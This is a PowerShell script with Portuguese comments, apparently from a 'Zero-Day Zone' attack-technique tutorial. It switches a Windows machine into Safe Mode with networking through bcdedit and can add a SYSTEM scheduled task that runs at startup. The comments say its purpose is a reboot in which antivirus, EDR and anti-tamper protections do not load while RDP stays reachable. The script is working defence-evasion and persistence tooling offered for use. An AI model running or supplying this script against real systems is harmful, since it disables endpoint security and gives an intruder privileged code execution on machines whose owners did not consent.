# safeboot.ps1 - "Not-Too-Safe Boot" (local): liga/desliga Safe Mode WITH NETWORK via BCD
# Fonte: Tutorials (Zero-Day Zone) - tecnica D1 do CATALOGO-TECNICAS.md
# Uso (admin):
#   powershell -File safeboot.ps1 status
#   powershell -File safeboot.ps1 on  [-op "cmd /c C:\lab\opera.cmd"]   # op opcional: tarefa ONSTART/SYSTEM p/ rodar no safeboot
#   powershell -File safeboot.ps1 off
# Notas: depois de 'on' -> REBOOT entra em safeboot c/ rede (RDP costuma funcionar; AV/EDR/anti-tamper NAO sobem).
#        'off' remove tudo; depois REBOOT volta ao normal.
param([string]$action='status', [string]$op='')
$ErrorActionPreference='Continue'
function L($m){ Write-Host ("[safeboot] "+$m) }
switch ($action) {
  'on' {
    bcdedit /set "{current}" safeboot network 2>&1 | Out-Null
    $s = (bcdedit /enum "{current}") | Select-String 'safeboot'
    L ("estado agora: " + $s)
    if ($op -ne '') {
      schtasks /create /tn sb_op /sc onstart /ru SYSTEM /rl highest /tr $op /f | Out-Null
      L ("tarefa sb_op (onstart SYSTEM) criada: " + $op)
    }
    L "REBOOT p/ ativar (ex: shutdown /r /t 0)"
  }
  'off' {
    bcdedit /deletevalue "{current}" safeboot 2>&1 | Out-Null
    schtasks /delete /tn sb_op /f 2>$null | Out-Null
    L "safeboot removido + tarefa sb_op apagada - REBOOT p/ normal"
  }
  default {
    $s = (bcdedit /enum "{current}") | Select-String 'safeboot'
    if ($s) { L ("safeboot ATIVO: " + $s) } else { L "safeboot inativo (boot normal)" }
    $t = schtasks /query /tn sb_op 2>$null
    if ($LASTEXITCODE -eq 0) { L "tarefa sb_op existe (rodara no proximo boot)" }
  }
}
